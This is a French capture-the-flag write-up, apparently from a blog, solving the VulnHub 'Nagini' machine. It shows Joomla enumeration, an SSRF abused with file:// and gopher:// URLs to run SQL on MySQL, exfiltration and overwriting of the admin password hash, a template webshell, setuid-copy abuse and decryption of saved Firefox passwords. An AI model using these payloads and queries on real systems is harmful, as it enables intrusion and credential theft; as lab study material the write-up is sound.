# Solution du CTF HarryPotter: Nagini de VulnHub

Nitro
-----

Après [le précédent](http://devloop.users.sourceforge.net/index.php?article224/solution-du-ctf-harrypotter-aragog-de-vulnhub) épisode de cette série de CTF j'ai volontiers sauté sur le second opus baptisé [HarryPotter: Nagini](https://www.vulnhub.com/entry/harrypotter-nagini,689/).  

L'occasion d'en extraire les 3 horcrux suivants et de continuer l'aventure.  

Pas plus de matière en quantité de services sur cette VM   

```plain
$ sudo nmap -sC -sV -T5 -p- 192.168.2.14
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
```

La présentation du site web est similaire à l'épisode précédent dans le sens où l'on est accueilli par une image de la saga cinématographique sans aucun lien vers une autre page.  

Via énumération on découvre un CMS Joomla présent :  

```plain
$ feroxbuster -u http://192.168.2.14/ -w DirBuster-0.12/directory-list-2.3-big.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.2.14/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      313c http://192.168.2.14/joomla
403        9l       28w      277c http://192.168.2.14/server-status
[####################] - 4m   1273562/1273562 0s      found:2       errors:0      
[####################] - 4m   1273562/1273562 4316/s  http://192.168.2.14/
```

Le CMS en question est vide (pas d'articles) et ne laisse pas transpirer son numéro de version (pas de tags méta, pas de footer particulier, pas de README qui traîne...)  

Le trademark indique tout de même 2021 qui laisse supposer qu'il s'agit d'une version récente... à moins que l'année soit affichée dynamiquement.  

Qu'est-ce que j'ai sous la main pour tester du Joomla ? Un petit coup de *locate* sur ma machine me ramène :  

* un [mass exploit](https://mukarramkhalid.com/mass-exploit-joomla-3-2-to-3-4-sql-injection/) qui semble dater de 2015 d'après le timestamp du fichier (lol)
* des templates Nuclei (rien de bien aggressif)
* des wordlists fuzzdb pour les plugins et les themes (toujours bon à prendre)
* un script NSE de Nmap pour réaliser une attaque brute force

A l'aide des wordlists je parvient à énumérer les entrées suivantes :  

```plain
200       22l      123w     2204c http://192.168.2.14/joomla/components/com_content/
200       16l       60w     1000c http://192.168.2.14/joomla/components/com_media/
200       21l      113w     1996c http://192.168.2.14/joomla/components/com_mailto/
200       21l      113w     2008c http://192.168.2.14/joomla/components/com_newsfeeds/
200       20l      102w     1800c http://192.168.2.14/joomla/components/com_search/
200       19l       91w     1663c http://192.168.2.14/joomla/modules/mod_articles_archive/
200       20l      101w     1813c http://192.168.2.14/joomla/components/com_wrapper/
200       19l       91w     1657c http://192.168.2.14/joomla/modules/mod_articles_latest/
200       19l       91w     1645c http://192.168.2.14/joomla/modules/mod_articles_news/
200       19l       92w     1669c http://192.168.2.14/joomla/modules/mod_articles_category/
200       19l       91w     1663c http://192.168.2.14/joomla/modules/mod_articles_popular/
200       19l       91w     1633c http://192.168.2.14/joomla/modules/mod_breadcrumbs/
200       23l      135w     2392c http://192.168.2.14/joomla/components/com_users/
200       19l       91w     1609c http://192.168.2.14/joomla/modules/mod_banners/
200       18l       80w     1402c http://192.168.2.14/joomla/modules/mod_footer/
200       19l       91w     1597c http://192.168.2.14/joomla/modules/mod_login/
200       19l       91w     1591c http://192.168.2.14/joomla/modules/mod_menu/
200       18l       81w     1402c http://192.168.2.14/joomla/modules/mod_custom/
200       19l       92w     1591c http://192.168.2.14/joomla/modules/mod_feed/
200       19l       91w     1603c http://192.168.2.14/joomla/modules/mod_search/
200       19l       90w     1645c http://192.168.2.14/joomla/modules/mod_related_items/
200       19l       91w     1639c http://192.168.2.14/joomla/modules/mod_random_image/
200       19l       91w     1639c http://192.168.2.14/joomla/modules/mod_users_latest/
200       19l       91w     1597c http://192.168.2.14/joomla/modules/mod_stats/
200       19l       91w     1627c http://192.168.2.14/joomla/modules/mod_whosonline/
200       19l       92w     1621c http://192.168.2.14/joomla/modules/mod_syndicate/
200       19l       90w     1609c http://192.168.2.14/joomla/modules/mod_wrapper/
200       20l      103w     1808c http://192.168.2.14/joomla/components/com_banners/
200       23l      135w     2400c http://192.168.2.14/joomla/components/com_contact/
```

Il ne reste plus qu'à essayer de croiser cela avec des exploits présents sur [exploit-db](https://www.exploit-db.com/) ou des CVE pour ces modules.  

Mon plus grand espoir reposait sur [un exploit de mars 2020](https://www.exploit-db.com/exploits/48202) pour le composant *com\_newsfeeds*. Il s'agit d'une faille d'injection SQL mais cette piste ne m'a mené nul part.  

Il était temps de passer à un outil plus *clé en main* capable si possible de faire le lien entre un numéro de version d'un module et un CVE.  

J'ai alors récupéré [joomscan](https://github.com/OWASP/joomscan) puisque c'est le seul dont je me rappelais clairement.  

```bash
git clone https://github.com/OWASP/joomscan.git
cd joomscan/
docker build -t rezasp/joomscan .
docker run --rm -it -v /tmp:/home/joomscan/reports --name joomscan_cli  rezasp/joomscan --url http://192.168.2.14/joomla/
```

Le résultat est déjà plus à la hauteur de mes espérances :  

```plain
[+] Detecting Joomla Version
[++] Joomla 3.9.25

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://192.168.2.14/joomla/administrator/components
http://192.168.2.14/joomla/administrator/modules
http://192.168.2.14/joomla/administrator/templates
http://192.168.2.14/joomla/tmp
http://192.168.2.14/joomla/images/banners

[+] admin finder
[++] Admin page : http://192.168.2.14/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.2.14/joomla/robots.txt 

Interesting path found from robots.txt
http://192.168.2.14/joomla/joomla/administrator/
http://192.168.2.14/joomla/administrator/
http://192.168.2.14/joomla/bin/
http://192.168.2.14/joomla/cache/
http://192.168.2.14/joomla/cli/
http://192.168.2.14/joomla/components/
http://192.168.2.14/joomla/includes/
http://192.168.2.14/joomla/installation/
http://192.168.2.14/joomla/language/
http://192.168.2.14/joomla/layouts/
http://192.168.2.14/joomla/libraries/
http://192.168.2.14/joomla/logs/
http://192.168.2.14/joomla/modules/
http://192.168.2.14/joomla/plugins/
http://192.168.2.14/joomla/tmp/

[+] Checking sensitive config.php.x file
[++] Readable config file is found 
 config file path : http://192.168.2.14/joomla/configuration.php.bak
```

On dispose ici d'un numéro de version (*3.9.25*, trop récent pour être exploitable) ainsi que d'un fichier de backup pour la configuration du CMS que voici :  

```php
 <?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Joomla CMS';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $debug_lang_const = '1';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'goblin';
        public $password = '';
        public $db = 'joomla';
        public $dbprefix = 'joomla_';
        public $live_site = '';
        public $secret = 'ILhwP6HTYKcN7qMh';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $ftp_host = '';
        public $ftp_port = '';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'site_admin@nagini.hogwarts';
        public $fromname = 'Joomla CMS';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = '';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/joomla/administrator/logs';
        public $tmp_path = '/var/www/html/joomla/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}
```

Les yeux les plus avisés noterons immédiatement :  

* les identifiants pour la base de données (mais le port MySQL n'est pas exposé et l'énumération web n'a pas remonté de phpMyAdmin ou équivalent)
* l'adresse mail de l'administrateur (Joomla semble accepter les emails pour identifiants)
* un *secret*, reste à savoir à quoi il sert (hash des mots de passe ? chiffrement des cookies ? etc) et si on peut l'exploiter
* le path de la racine web, toujours pratique

Après quelques recherches je jette l'option sur le secret qui n'est spécifique ni aux cookies ni aux hashs.  

J'ai testé aussi [droopescan](https://github.com/SamJoan/droopescan) (qui n'est pas spécifique à Drupal) et [CMSeeK](https://github.com/Tuhinshubhra/CMSeeK) sans en extraire plus d'informations.  

Mon dernier espoir résidait alors dans le brute force du compte admin après avoir préalablement généré des mutations du mot *globin* qui est utilisé comme user pour la base de données.  

```bash
nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=mutations.txt,http-joomla-brute.threads=5,brute.firstonly=true,http-joomla-brute.uri=/joomla/administrator/index.php' 192.168.2.14
```

Une vérification du trafic à destination de la VM avec *tshark* m'a permis d'apprécier la qualité du script Nmap qui allait correctement chercher le token anti-CSRF et envoyait bien les paires user/password attendues.  

J'ai jeté l'éponge après un moment vu que le temps de bruteforce devenait trop conséquent.  

Tu n'as pas eu le mémo ?
------------------------

Force est de constater que j'ai raté un élément lors de l'énumération. *Feroxbuster* permettant aussi de balancer quelques suffixes il m'aura permis de retrouver un fichier *note.txt* à la racine du site.  

```bash
$ feroxbuster -u http://192.168.2.14/ -w DirBuster-0.12/directory-list-2.3-big.txt -n -x html,php,txt
```

```plain
Hello developers!!

I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.

Regards,
site_admin
```

Étonnant que cette note mentionne du HTTPS alors que ce ne soit pas le cas... typo ? Je rajoute cette entrée à mon fichier *hosts* et.... nada. J'obtiens exactement le même contenu.  

Bon, HTTP2 je veux bien mais HTTP3 c'est quoi exactement ? [HTTP3](https://en.wikipedia.org/wiki/HTTP/3) existe bien et est donc un successeur aux deux autres. C'est toujours un proto de haut niveau, la différence notable est qu'il n'est plus transporté par TCP mais par une autre couche qui s'appelle [QUIC](https://en.wikipedia.org/wiki/QUIC).  

Bref il nous faut un client spécifique pour accéder à ce site. Firefox et Chrome sont sensés supporter le protocole pourtant même en jouant avec les réglages ils ne semblent pas en mesure de détecter *QUIC* sur ce serveur.  

*cURL* le supporte aussi malheureusement le binaire dont je dispose n'est pas compilé avec son support. Ça aurait pourtant été fort pratique.  

Une recherche via mon gestionnaire de paquets me rapporte l'existence d'un module Python baptisé [aioquic](https://github.com/aiortc/aioquic).  

La documentation pour ce module ne semble pas forcément parlante et nécessite peut être d’emblée quelques connaissances sur *QUIC* heureusement le projet dispose de quelques [exemples](https://github.com/aiortc/aioquic/tree/main/examples) dont un client HTTP qui propose des options qui imitent *cURL*.  

L'installation aura nécessité une dépendance supplémentaire. Le client quand à lui n'affiche pas la réponse sur la sortie standard il faut donc indiquer un dossier où stocker les réponses :  

```bash
git clone https://github.com/aiortc/aioquic.git
cd aioquic/
pipenv shell --three
python setup.py install
pip install wsproto
mkdir dl
python examples/http3_client.py -k https://quic.nagini.hogwarts/ --output-dir dl
```

On obtient le message suivant :  

```plain
Greetings Developers!!

I am having two announcements that I need to share with you:

1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.

Regards,
site_admin
```

Exploitation de SSRF
--------------------

Le point 2 mentionné précédemment semble correspondre au fichier de backup que l'on a déjà trouvé.  

L'autre point nous mène vers un script PHP (accessible classiquement via HTTP 1.1). C'est un formulaire qui permet de taper une URL qui est aussitôt crawlée et dont la réponse est retournée).  

Du moins il y a quelques restrictions puisque les accès sortants ne semblent pas autorisés sur cette machine.  

Dans un premier temps il faut pouvoir déterminer quel type de client est utilisé. Est-ce PHP avec un simple *readfile* ou s'agit-il d'une inclusion ? Est-ce la librairie *cURL* qui est utilisée ? Vu qu'il s'agit d'un script PHP ce sont les plus probables.  

Si je soumet */etc/passwd* rien n'est retourné. En revanche en demandant *file:///etc/passwd* ça fonctionne :  

```plain
--- snip ---
snape:x:1000:1000:Snape,,,:/home/snape:/bin/bash
ron:x:1001:1001::/home/ron:/bin/sh
hermoine:x:1002:1002::/home/hermoine:/bin/bash
--- snip ---
```

C'est là que le path présent dans la configuration nous est utile, tachons d'accéder au script PHP (*file:///var/www/html/internalResourceFeTcher.php*)   

```php
<?php

if (!isset($_GET['url']))
{
	exit;
}
$url=$_GET['url'];

if (empty($url))
{
	exit;
}

$scheme = parse_url($url, PHP_URL_SCHEME);
#if (!preg_match('/^https?$/i', $scheme))
#{
#	echo "Don't Try to be smart. We have implemented SSRF protections.";
#	exit;
#}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$exec = curl_exec($ch);
echo $exec;
?>
```

Parfait ! La protection SSRF doit faire référence au filtrage réseau. Pour le reste on est libre de switcher sur un autre schéma pour les URLs soumises et d'après la page de manuel de cURL il y en a beaucoup :  

```plain
DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT,
 POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP
```

Ici il n'y a rien qui pourrait nous être utile *directement* puisque aucun serveur FTP / SMB, etc n'a été mentionné mais gopher est connu pour permettre de *convertir* en quelques sortes une URL de départ en l'envoi de données brutes vers un port choisi.  

Pour vous en rendre compte ouvrez un netcat sur le port 8000 de votre machine et exécutez la commande suivante :  

```bash
curl gopher://127.0.0.1:8000/_OPTIONS%20/%20HTTP/1.0%0d%0a%0d%0a
```

Le netcat devrait réagir de cette manière :  

```plain
$ ncat -l -p 8000 -v
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:56796.
OPTIONS / HTTP/1.0

```

Le cURL s'est ainsi connecté au port 8000 et a passé bêtement tout ce qui était après l'underscore sur la socket.  

Couplé avec certaines attaques qui ont touché par exemple Redis (exploitation de la commande CONFIG [ici](https://www.trendmicro.com/en_za/research/20/d/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining.html) et [là](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html), exploitation de la réplication [ici](https://github.com/vulhub/redis-rogue-getshell) et [là](https://www.exploit-db.com/exploits/48272)) ça peut faire un cocktail explosif. Il en est de même [pour AWS](https://janisagar.medium.com/aws-and-ssrf-attack-using-instance-metadata-2526966d12e6).  

Ici nous avons affaire à un serveur MySQL que l'on peut contacter en utilisant des URLs gopher. Seulement MySQL peut-il permettre d'effectuer des opérations sans des aller-retour de paquets ?  

Après recherche il semble que si la base de données n'est pas protégée par un mot de passe (comme c'est le cas d'après le fichier de configuration PHP dumpé) alors c'est possible. L'outil [Gopherus](https://github.com/tarunkant/Gopherus) permet de saisir les commandes SQL que l'on voudra faire exécuter et nous retourne l'URL gopher correspondante.  

Le code de [Gopherus](https://github.com/tarunkant/Gopherus/blob/master/scripts/MySQL.py) n'est malheureusement pas assez commenté pour avoir une explication, on va le croire sur parole :p  

L'utilisation prend ces formes :  

```plain
$ python gopherus.py --exploit mysql

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: show databases;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

J'ai copié/collé cette URL dans le formulaire mais n'ai rien eu en retour. J'ai donc fait tout le cheminement en aveugle mais après résolution et avoir jeté un œil à d'autres writeups il semblerait que le script est en fait capricieux et il peut être possible d'obtenir l'output après quelques tentatives. Je me suis tout de même bien amusé en suivant ce chemin là.  

Ainsi je n'avais pas d'output pour une requête aussi simple que *select \* from joomla.joomla\_users;* mais j'obtenais bien une temporisation avec *select sleep(10) from joomla.joomla\_users;* donc l'exécution du SQL est effective !  

Il y avait dès lors deux, non, trois scénarios d'exploitation :  

* utilisation de la technique time-based : j'utilise la fonction *IF()* de MySQL avec *sleep()* pour par exemple extraire le password hashé de l'administrateur. Ça nécessite par contre beaucoup de temps de développement et d'exécution :(
* utilisation de INTO OUTFILE pour écrire directement un webshell dans un des paths du Joomla. Malheureusement le MySQL doit être récent donc ce scénario est assez improbable (un dossier restreint est défini par défaut) sans compter que l'utilisateur de la DB n'est pas root
* modification d'une entrée existante dans la DB du Joomla comme vecteur d'exfiltration des données (par exemple le titre du site Internet) : une requête du style *update config set title = (select password from users)* devrait faire l'affaire

Après quelques essais le OUTFILE ne s'avère pas exploitable. Let's go pour la modification d'une entrée de la DB.  

J'ai trouvé [cette documentation de Joomla](https://docs.joomla.org/Tables) qui décrit les différentes tables de la DB.  

Malheureusement le titre du site semble définit uniquement dans la config PHP. J'ai tenté quelques modifications sur la table liée au composant *com\_newsfeeds* sans plus de résultats.  

Il est temps de faire tourner un Docker MySQL et un Docker Joomla et trouver un enregistrement intéressant.  

J'ai trouvé [cet article](https://dev.to/pierangelo1982/joomla-mysql-phpmyadmin-in-docker-19pc) qui indique comment manier les deux :  

```bash
docker run --name test-mysql -v /tmp/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=12345678 -d mysql
docker run --name test-joomla --link test-mysql:db -e JOOMLA_DB_HOST=db:3306 -e JOOMLA_DB_USER=root -e JOOMLA_DB_PASSWORD=12345678 -v /tmp/joomla:/var/www/html -p 80:80 -d joomla
```

Je n'entre pas dans le détails des commandes Docker mais il manque l'option *--rm* qui supprime le conteneur après son exécution. L'option -v quand à elle permet de spécifier des volumes, sorte de points de montage qui sont partagés entre votre machine et le container (si vous voulez transférer des données).  

Une fois lancés ouvrez le browser sur votre port 80 et effectuez la configuration du Joomla. Quand la config de la base de données est demandée spécifiez *db* puisque c'est le nom d'hôte que Docker attribue au MySQL (option *--link*).  

Après la config faite j'ai récupéré un shell sur le container MySQL (*docker exec --it /bin/bash id\_du\_container* de mémoire) et dumpé la base Joomla avec *mysqldump* dans le dossier partagé.  

J'ai ensuite fait un simple *grep* sur le dump pour retrouver un élément affiché sur la page d'accueil du Joomla, en l’occurrence j'avais *Cassiopeia* qui semble correspondre au thème par défaut :  

```plain
INSERT INTO `joomla_template_styles` VALUES 
(11,'cassiopeia',0,'1','Cassiopeia - Default',0,'','{\"brand\":\"1\",\"logoFile\":\"\",\"siteTitle\":\"\",\"siteDescription\":\"\",
--- snip ---
```

Ça semblait prometteur et modifier l'entrée fonctionnait sur mon Docker mais je n'avais aucun changement sur la VM du CTF.  

Finalement cette table a attiré mon attention :  

```plain
CREATE TABLE `joomla_menu` (
  `id` int NOT NULL AUTO_INCREMENT,
  `menutype` varchar(24) COLLATE utf8mb4_unicode_ci NOT NULL',
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `alias` varchar(400) CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NOT NULL,
  `note` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',                                                  
  `path` varchar(1024) COLLATE utf8mb4_unicode_ci NOT NULL,
  `link` varchar(1024) COLLATE utf8mb4_unicode_ci NOT NULL,
  `type` varchar(16) COLLATE utf8mb4_unicode_ci NOT NULL,
--- snip ---                                                                
  PRIMARY KEY (`id`),                                                                                                  
  UNIQUE KEY `idx_client_id_parent_id_alias_language` (`client_id`,`parent_id`,`alias`(100),`language`),
  KEY `idx_componentid` (`component_id`,`menutype`,`published`,`access`),
  KEY `idx_menutype` (`menutype`),
  KEY `idx_left_right` (`lft`,`rgt`),
  KEY `idx_alias` (`alias`(100)),
  KEY `idx_path` (`path`(100)),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB AUTO_INCREMENT=102 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
```

Tout particulièrement cet enregistrement :  

```plain
(101,'mainmenu','Home','home','','home','index.php?option=com_content&view=featured','component',--- snip ---
```

Il s'agit du menu affiché à la droite de la page d'accueil. Le texte *Home* est celui le plus visible dans cet enregistrement.  

Je teste simplement la requête suivante :  

```plain
update joomla.joomla_menu set title = 'HiThere' where title = 'Home';
```

Bingo ! J'obtiens la modification espérée sur la page. Pus qu'à y placer le password de l'administrateur :  

```plain
update joomla.joomla_menu set title = (select password from joomla.joomla_users where email = 'site_admin@nagini.hogwarts') where title = 'HiThere';
```

![Altered Joomla database VulnHub Nagini CTF](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/nagini.png)

Le hash semble assez corsé à casser, il faut dire déjà que c'est du *brcrypt*. A la place je récupère le hash présent dans mon conteneur MySQL et dont je connais le clair (*mysuperpassword*) et j'écrase celui du CTF :  

```plain
update joomla.joomla_users set password = '$2y$10$JjZOcbgpLz4wRxFKcULpCeJloGZ06lMMr7C0Rt6WkiQJWnMmiA0Gm' where email = 'site_admin@nagini.hogwarts';
```

Promenade Unix
--------------

Je ne suis pas un expert Joomla mais l'appli permet d'éditer des fichiers du CMS. En fouillant un peu j'ai trouvé le fichier *index.php* du thème par défaut (*protostar* qu'on voit mentionné quand on regarde la source de la page d'accueil) et j'y ait ajouté un classique appel à *system().*  

Ainsi l'URL *http://192.168.2.14/joomla/templates/protostar/?cmd=id* me retourne :  

```plain
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Avec la commande *find* je retrouve un premier horcrux (*/var/www/html/horcrux1.txt*) appartenant à l'utilisateur *ron* :  

```plain
horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
```

Dans le dossier de l'utilisateur *snape* je retrouve des identifiants :  

```plain
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
```

Une fois décodé (c'est du base64) j'obtiens le mot de passe *Love@lilly* qui m'ouvre un accès SSH.  

Le second horcrux est présent dans le dossier de *hermoine*. On ne peut pas le lire faute de permissions mais une copie du binaire *cp* a été laissé avec les droits setuid de l'utilisatrice :  

```plain
snape@Nagini:/home/hermoine$ cat horcrux2.txt 
cat: horcrux2.txt: Permission denied
snape@Nagini:/home/hermoine$ ls -l horcrux2.txt 
-r--r----- 1 hermoine hermoine 75 Apr  4  2021 horcrux2.txt
snape@Nagini:/home/hermoine$ ls -l bin/su_cp
-rwsr-xr-x 1 hermoine hermoine 146880 Apr  4  2021 su_cp
snape@Nagini:/home/hermoine$ ./bin/su_cp horcrux2.txt /tmp/
snape@Nagini:/home/hermoine$ ls -l /tmp/horcrux2.txt 
-r--r----- 1 hermoine snape 75 Nov 27 22:23 /tmp/horcrux2.txt
snape@Nagini:/home/hermoine$ cat /tmp/horcrux2.txt
horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
```

Il est possible d'utiliser ce même exécutable pour ajouter notre clé publique SSH aux clés autorisées :  

```plain
snape@Nagini:/tmp$ ~hermoine/bin/su_cp authorized_keys ~hermoine/.ssh/
snape@Nagini:/tmp$ ls -al  ~hermoine/.ssh/
total 12
drwxr-xr-x 2 hermoine hermoine 4096 Nov 27 22:31 .
drwxr-xr-x 6 hermoine hermoine 4096 Apr  4  2021 ..
-rw-r----- 1 hermoine snape     725 Nov 27 22:31 authorized_keys
```

I know what you did
-------------------

On ne trouve pas plus d'indices classiques pouvant mener à de l'escalade de privilèges. En revanche l'utilisatrice a un dossier *.mozilla/firefox* ce qui est un peu étrange pour une machine qui n'a pas d'interface graphique...  

Je rapatrie le dossier via scp et je lance [firefox\_decrypt](https://github.com/Unode/firefox_decrypt) dessus :  

```plain
$ python3 firefox_decrypt.py firefox/
Traceback (most recent call last):
  File "firefox_decrypt.py", line 46, in <module>
    PWStore = list[dict[str, str]]
TypeError: 'type' object is not subscriptable
```

Un petit fix et une [pull request](https://github.com/unode/firefox_decrypt/pull/78/files) plus tard :

```plain
$ python3 firefox_decrypt.py firefox/

Website:   http://nagini.hogwarts
Username: 'root'
Password: '@Alohomora#123'
```

Ce qui permet l'accès root et la récupération du dernier horcrux :  

```plain
# cat horcrux3.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   

Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Medium
Machine Name: Nagini
Horcruxes Hidden in this VM: 3 horcruxes

You have successfully pwned Nagini machine.
Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=}
```

Groovy !  


*Published November 28 2021 at 17:29*